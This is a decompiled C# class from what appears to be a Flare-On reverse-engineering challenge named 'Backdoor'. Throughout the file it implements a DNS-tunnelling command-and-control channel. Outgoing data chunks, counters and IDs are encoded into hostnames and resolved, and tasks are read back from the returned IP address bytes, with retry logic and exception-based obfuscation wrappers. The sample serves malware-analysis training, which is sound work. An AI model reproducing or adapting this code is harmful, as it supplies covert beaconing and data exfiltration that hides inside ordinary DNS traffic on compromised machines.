using System;
using System.Linq;
using System.Net;

namespace FlareOn.Backdoor
{
	// Token: 0x02000007 RID: 7
	public class FLARE05
	{
		// Token: 0x0600002F RID: 47 RVA: 0x00002FA0 File Offset: 0x00009FA0
		public static FLARE07 flared_19()
		{
			FLARE07 ret = FLARE07.B;
			bool flag = FLARE03.flare_11() != null || FLARE05.flare_31(new Func<bool>(FLARE05.flare_27));
			if (flag)
			{
				FLARE05.flare_31(() => FLARE05.flare_26(out ret));
			}
			return ret;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003000 File Offset: 0x0000A000
		public static FLARE07 flare_19()
		{
			FLARE07 result;
			try
			{
				result = FLARE05.flared_19();
			}
			catch (InvalidProgramException e)
			{
				result = (FLARE07)FLARE15.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x0000303C File Offset: 0x0000A03C
		public static FLARE07 flared_20()
		{
			FLARE07 ret = FLARE07.B;
			Func<bool> fn = null;
			for (;;)
			{
				bool flag;
				if (FLARE05.D < FLARE05.C)
				{
					if (fn == null)
					{
						fn =  (() => FLARE05.flare_23(out ret));
					}
					flag = FLARE05.flare_31(fn);
				}
				else
				{
					flag = false;
				}
				if (!flag)
				{
					break;
				}
				FLARE15.flare_65(FLARE06.DT.B);
			}
			return ret;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000030A4 File Offset: 0x0000A0A4
		public static FLARE07 flare_20()
		{
			FLARE07 result;
			try
			{
				result = FLARE05.flared_20();
			}
			catch (InvalidProgramException e)
			{
				result = (FLARE07)FLARE15.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000030E0 File Offset: 0x0000A0E0
		public static FLARE07 flared_21()
		{
			FLARE07 ret = FLARE07.B;
			Func<bool> fn = null;
			for (;;)
			{
				if (FLARE05.G >= FLARE05.F)
				{
					goto IL_56;
				}
				
				if (fn == null)
				{
					fn = (() => FLARE05.flare_24(out ret));
				}
				if (!FLARE05.flare_31(fn))
				{
					goto IL_56;
				}
				bool flag = ret == FLARE07.B;
				IL_57:
				if (!flag)
				{
					break;
				}
				FLARE15.flare_65(FLARE06.DT.B);
				continue;
				IL_56:
				flag = false;
				goto IL_57;
			}
			return ret;
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00003154 File Offset: 0x0000A154
		public static FLARE07 flare_21()
		{
			FLARE07 result;
			try
			{
				result = FLARE05.flared_21();
			}
			catch (InvalidProgramException e)
			{
				result = (FLARE07)FLARE15.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00003190 File Offset: 0x0000A190
		public static FLARE07 flared_22()
		{
			FLARE07 ret = FLARE07.B;
			Func<bool> fn = null;
			for (;;)
			{
				bool flag;
				if (FLARE05.D < FLARE05.C && FLARE05.G < FLARE05.F)
				{
					if (fn == null)
					{
						fn = () => FLARE05.flare_25(out ret);
					}
					flag = FLARE05.flare_31(fn);
				}
				else
				{
					flag = false;
				}
				if (!flag)
				{
					break;
				}
				FLARE15.flare_65(FLARE06.DT.B);
			}
			return ret;
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00003204 File Offset: 0x0000A204
		public static FLARE07 flare_22()
		{
			FLARE07 result;
			try
			{
				result = FLARE05.flared_22();
			}
			catch (InvalidProgramException e)
			{
				result = (FLARE07)FLARE15.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003240 File Offset: 0x0000A240
		public static bool flared_23(out FLARE07 r)
		{
			FLARE05.flare_29(FLARE06.DomT.C, FLARE15.flare_60(FLARE05.D).PadLeft(3, FLARE03.chars_domain[0]));
			r = FLARE07.B;
			byte[] d;
			bool flag = FLARE05.flare_30(out d);
			bool flag2 = flag && FLARE05.flare_32(d);
			if (flag2)
			{
				r = FLARE07.D;
			}
			return flag;
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003298 File Offset: 0x0000A298
		public static bool flare_23(out FLARE07 r)
		{
			bool result;
			try
			{
				result = FLARE05.flared_23(out r);
			}
			catch (InvalidProgramException e)
			{
				r = FLARE07.B;
				object[] array = new object[]
				{
					r
				};
				bool flag = (bool)FLARE15.flare_70(e, array);
				r = (FLARE07)array[0];
				result = flag;
			}
			return result;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000032F4 File Offset: 0x0000A2F4
		public static bool flared_24(out FLARE07 r)
		{
			int val = FLARE05.F - FLARE05.G;
			int num = Math.Min(FLARE03.send_count, val);
			bool flag = FLARE05.G == 0;
			if (flag)
			{
				FLARE05.flare_29(FLARE06.DomT.B, FLARE15.flare_60(FLARE05.G).PadLeft(3, FLARE03.chars_domain[0]) + FLARE15.flare_60(FLARE05.F).PadLeft(3, FLARE03.chars_domain[0]) + FLARE01.flare_01(FLARE05.H.Skip(FLARE05.G).Take(num).ToArray<byte>()));
			}
			else
			{
				FLARE05.flare_29(FLARE06.DomT.B, FLARE15.flare_60(FLARE05.G).PadLeft(3, FLARE03.chars_domain[0]) + FLARE01.flare_01(FLARE05.H.Skip(FLARE05.G).Take(num).ToArray<byte>()));
			}
			r = FLARE07.B;
			byte[] r2;
			bool flag2 = FLARE05.flare_30(out r2);
			bool flag3 = flag2;
			if (flag3)
			{
				bool flag4 = FLARE05.flare_33(r2);
				if (flag4)
				{
					r = FLARE07.C;
				}
				bool flag5 = FLARE05.flare_34(num);
				if (flag5)
				{
					bool flag6 = r == FLARE07.C;
					if (flag6)
					{
						r = FLARE07.G;
						return flag2;
					}
					r = FLARE07.F;
				}
			}
			return flag2;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003428 File Offset: 0x0000A428
		public static bool flare_24(out FLARE07 r)
		{
			bool result;
			try
			{
				result = FLARE05.flared_24(out r);
			}
			catch (InvalidProgramException e)
			{
				r = FLARE07.B;
				object[] array = new object[]
				{
					r
				};
				bool flag = (bool)FLARE15.flare_70(e, array);
				r = (FLARE07)array[0];
				result = flag;
			}
			return result;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003484 File Offset: 0x0000A484
		public static bool flared_25(out FLARE07 r)
		{
			int val = FLARE05.F - FLARE05.G;
			int num = Math.Min(FLARE03.send_count, val);
			FLARE05.flare_29(FLARE06.DomT.D, FLARE15.flare_60(FLARE05.G).PadLeft(3, FLARE03.chars_domain[0]) + FLARE15.flare_60(FLARE05.D).PadLeft(3, FLARE03.chars_domain[0]) + FLARE01.flare_01(FLARE05.H.Skip(FLARE05.G).Take(num).ToArray<byte>()));
			r = FLARE07.B;
			byte[] d;
			bool flag = FLARE05.flare_30(out d);
			bool flag2 = flag;
			if (flag2)
			{
				bool flag3 = FLARE05.flare_32(d);
				if (flag3)
				{
					r = FLARE07.D;
				}
				bool flag4 = FLARE05.flare_34(num);
				if (flag4)
				{
					bool flag5 = r == FLARE07.D;
					if (flag5)
					{
						r = FLARE07.H;
						return flag;
					}
					r = FLARE07.F;
				}
			}
			return flag;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x0000355C File Offset: 0x0000A55C
		public static bool flare_25(out FLARE07 r)
		{
			bool result;
			try
			{
				result = FLARE05.flared_25(out r);
			}
			catch (InvalidProgramException e)
			{
				r = FLARE07.B;
				object[] array = new object[]
				{
					r
				};
				bool flag = (bool)FLARE15.flare_70(e, array);
				r = (FLARE07)array[0];
				result = flag;
			}
			return result;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000035B8 File Offset: 0x0000A5B8
		public static bool flared_26(out FLARE07 r)
		{
			FLARE05.flare_29(FLARE06.DomT.E, string.Empty);
			r = FLARE07.B;
			byte[] r2;
			bool flag = FLARE05.flare_30(out r2);
			bool flag2 = flag && FLARE05.flare_33(r2);
			if (flag2)
			{
				r = FLARE07.C;
			}
			return flag;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000035F8 File Offset: 0x0000A5F8
		public static bool flare_26(out FLARE07 r)
		{
			bool result;
			try
			{
				result = FLARE05.flared_26(out r);
			}
			catch (InvalidProgramException e)
			{
				r = FLARE07.B;
				object[] array = new object[]
				{
					r
				};
				bool flag = (bool)FLARE15.flare_70(e, array);
				r = (FLARE07)array[0];
				result = flag;
			}
			return result;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003654 File Offset: 0x0000A654
		public static bool flared_27()
		{
			FLARE05.flare_29(FLARE06.DomT.A, FLARE03.alive_key);
			byte[] array;
			bool flag = FLARE05.flare_30(out array);
			bool flag2 = flag;
			if (flag2)
			{
				FLARE03.flare_08((int)array[3]);
			}
			return flag;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000368C File Offset: 0x0000A68C
		public static bool flare_27()
		{
			bool result;
			try
			{
				result = FLARE05.flared_27();
			}
			catch (InvalidProgramException e)
			{
				result = (bool)FLARE15.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x0000209D File Offset: 0x0000909D
		public static void flared_28(byte[] s)
		{
			FLARE05.G = 0;
			FLARE05.F = s.Length;
			FLARE05.H = s;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000036C8 File Offset: 0x0000A6C8
		public static void flare_28(byte[] s)
		{
			try
			{
				FLARE05.flared_28(s);
			}
			catch (InvalidProgramException e)
			{
				FLARE15.flare_70(e, new object[]
				{
					s
				});
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00003708 File Offset: 0x0000A708
		public static void flared_29(FLARE06.DomT dt, string d)
		{
			bool flag = FLARE05.B == 0;
			if (flag)
			{
				bool flag2 = dt == FLARE06.DomT.E;
				if (flag2)
				{
					FLARE05.A = FLARE15.flare_60(FLARE03.flare_11().Value);
				}
				else
				{
					bool flag3 = dt == FLARE06.DomT.A;
					if (flag3)
					{
						FLARE05.A = FLARE15.flare_60((int)dt) + d;
					}
					else
					{
						FLARE05.A = FLARE15.flare_60((int)dt) + FLARE15.flare_60(FLARE03.flare_11().Value) + d;
					}
				}
				string s = FLARE15.flare_58(FLARE03.flare_10());
				FLARE05.A = FLARE15.flare_59(FLARE05.A, s) + FLARE15.flare_61(FLARE03.flare_10()).PadLeft(3, FLARE03.chars_counter[0]) + "." + FLARE03.flare_14();
			}
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000037D4 File Offset: 0x0000A7D4
		public static void flare_29(FLARE06.DomT dt, string d)
		{
			try
			{
				FLARE05.flared_29(dt, d);
			}
			catch (InvalidProgramException e)
			{
				FLARE15.flare_70(e, new object[]
				{
					dt,
					d
				});
			}
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00003820 File Offset: 0x0000A820
		public static bool flared_30(out byte[] r)
		{
			bool result = true;
			r = null;
			try
			{
				IPHostEntry iphostEntry = Dns.Resolve(FLARE05.A);
				r = iphostEntry.AddressList[0].GetAddressBytes();
				FLARE05.B = 0;
				FLARE03.flare_09();
			}
			catch
			{
				FLARE05.B++;
				result = false;
			}
			return result;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00003888 File Offset: 0x0000A888
		public static bool flare_30(out byte[] r)
		{
			bool result;
			try
			{
				try
				{
					result = FLARE05.flared_30(out r);
				}
				catch (InvalidProgramException e)
				{
					r = null;
					object[] array = new object[]
					{
						r
					};
					bool flag = (bool)FLARE15.flare_70(e, array);
					r = (byte[])array[0];
					result = flag;
				}
			}
			catch
			{
				FLARE05.B++;
				r = null;
				result = false;
			}
			return result;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00003900 File Offset: 0x0000A900
		public static bool flared_31(Func<bool> fn)
		{
			bool result = false;
			FLARE05.B = 0;
			while (!fn() && FLARE05.B < FLARE03.max_try)
			{
				FLARE15.flare_65(FLARE06.DT.D);
			}
			bool flag = FLARE05.B >= FLARE03.max_try;
			if (flag)
			{
				FLARE05.B = 0;
				FLARE03.flare_09();
			}
			else
			{
				result = true;
			}
			return result;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003968 File Offset: 0x0000A968
		public static bool flare_31(Func<bool> fn)
		{
			bool result;
			try
			{
				result = FLARE05.flared_31(fn);
			}
			catch (InvalidProgramException e)
			{
				result = (bool)FLARE15.flare_70(e, new object[]
				{
					fn
				});
			}
			return result;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000039AC File Offset: 0x0000A9AC
		public static bool flared_32(byte[] d)
		{
			int val = FLARE05.C - FLARE05.D;
			ushort length = (ushort)Math.Min(d.Length, val);
			Array.Copy(d, 0, FLARE05.E, FLARE05.D, (int)length);
			FLARE05.D += 4;
			bool flag = FLARE05.D >= FLARE05.C;
			bool result;
			if (flag)
			{
				byte[] array = new byte[FLARE05.C];
				Array.Copy(FLARE05.E, 0, array, 0, FLARE05.C);
				FLARE14.ListData.Add(array);
				FLARE05.D = 0;
				FLARE05.C = 0;
				Array.Clear(FLARE05.E, 0, FLARE05.E.Length);
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003A5C File Offset: 0x0000AA5C
		public static bool flare_32(byte[] d)
		{
			bool result;
			try
			{
				result = FLARE05.flared_32(d);
			}
			catch (InvalidProgramException e)
			{
				result = (bool)FLARE15.flare_70(e, new object[]
				{
					d
				});
			}
			return result;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003AA0 File Offset: 0x0000AAA0
		public static bool flared_33(byte[] r)
		{
			bool flag = r[0] >= 128;
			bool result;
			if (flag)
			{
				FLARE05.D = 0;
				FLARE05.C = FLARE15.flare_62(r.Skip(1).Take(3).ToArray<byte>());
				FLARE05.E = new byte[FLARE05.C];
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00003AFC File Offset: 0x0000AAFC
		public static bool flare_33(byte[] r)
		{
			bool result;
			try
			{
				result = FLARE05.flared_33(r);
			}
			catch (InvalidProgramException e)
			{
				result = (bool)FLARE15.flare_70(e, new object[]
				{
					r
				});
			}
			return result;
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00003B40 File Offset: 0x0000AB40
		public static bool flared_34(int s)
		{
			FLARE05.G += s;
			bool flag = FLARE05.G >= FLARE05.F;
			bool result;
			if (flag)
			{
				FLARE05.G = 0;
				FLARE05.F = 0;
				Array.Clear(FLARE05.H, 0, FLARE05.H.Length);
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003B98 File Offset: 0x0000AB98
		public static bool flare_34(int s)
		{
			bool result;
			try
			{
				result = FLARE05.flared_34(s);
			}
			catch (InvalidProgramException e)
			{
				result = (bool)FLARE15.flare_70(e, new object[]
				{
					s
				});
			}
			return result;
		}

		// Token: 0x04000015 RID: 21
		public static string A;

		// Token: 0x04000016 RID: 22
		public static int B;

		// Token: 0x04000017 RID: 23
		public static int C;

		// Token: 0x04000018 RID: 24
		public static int D;

		// Token: 0x04000019 RID: 25
		public static byte[] E;

		// Token: 0x0400001A RID: 26
		public static int F;

		// Token: 0x0400001B RID: 27
		public static int G;

		// Token: 0x0400001C RID: 28
		public static byte[] H;
	}
}
